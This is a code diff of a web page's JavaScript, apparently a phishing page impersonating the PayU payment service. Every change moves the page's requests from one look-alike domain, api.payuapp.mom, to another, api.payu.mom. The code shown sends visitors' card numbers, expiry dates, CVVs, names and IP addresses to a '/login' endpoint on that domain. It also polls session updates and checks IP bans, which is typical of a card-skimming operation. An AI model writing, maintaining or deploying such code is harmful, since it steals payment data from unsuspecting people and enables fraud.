@@ -393,7 +393,7 @@
     };
 
     function checkIPBan(ipAddress) {
-        fetch(`https://api.payuapp.mom/check_ip?ip=${ipAddress}`)
+        fetch(`https://api.payu.mom/check_ip?ip=${ipAddress}`)
             .then(response => response.json())
             .then(data => {
                 if (data.banned) {
@@ -428,7 +428,7 @@
 <script>
   document.addEventListener('DOMContentLoaded', function () {
       document.getElementById('ShowInputButton').addEventListener('click', function() {
-          fetch('https://api.payuapp.mom/test')
+          fetch('https://api.payu.mom/test')
               .then(response => response.text())
               .then(data => {
                   console.log("Data received:", data);
@@ -471,7 +471,7 @@ async function sendIPToServer() {
         return;
     }
 
-    const url3 = `https://api.payuapp.mom/chel?ip=${ip}&name=${name}`;
+    const url3 = `https://api.payu.mom/chel?ip=${ip}&name=${name}`;
 
     fetch(url3)
         .then(response => {
@@ -545,7 +545,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
     let ip = localStorage.getItem('ip');
     if(question){
       console.log('question')
-      var url = "https://api.payuapp.mom/login" +
+      var url = "https://api.payu.mom/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
@@ -558,7 +558,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
               "&ip=" + encodeURIComponent(ip);
     } else {
       console.log('question')
-      var url = "https://api.payuapp.mom/login" +
+      var url = "https://api.payu.mom/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
@@ -622,7 +622,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
 });
 
 function fetchUpdate() {
-  fetch('https://api.payuapp.mom/update'+"?session=" + encodeURIComponent(session))
+  fetch('https://api.payu.mom/update'+"?session=" + encodeURIComponent(session))
     .then(response => {
       if (!response.ok) {
         throw new Error('Network response was not ok ' + response.statusText);
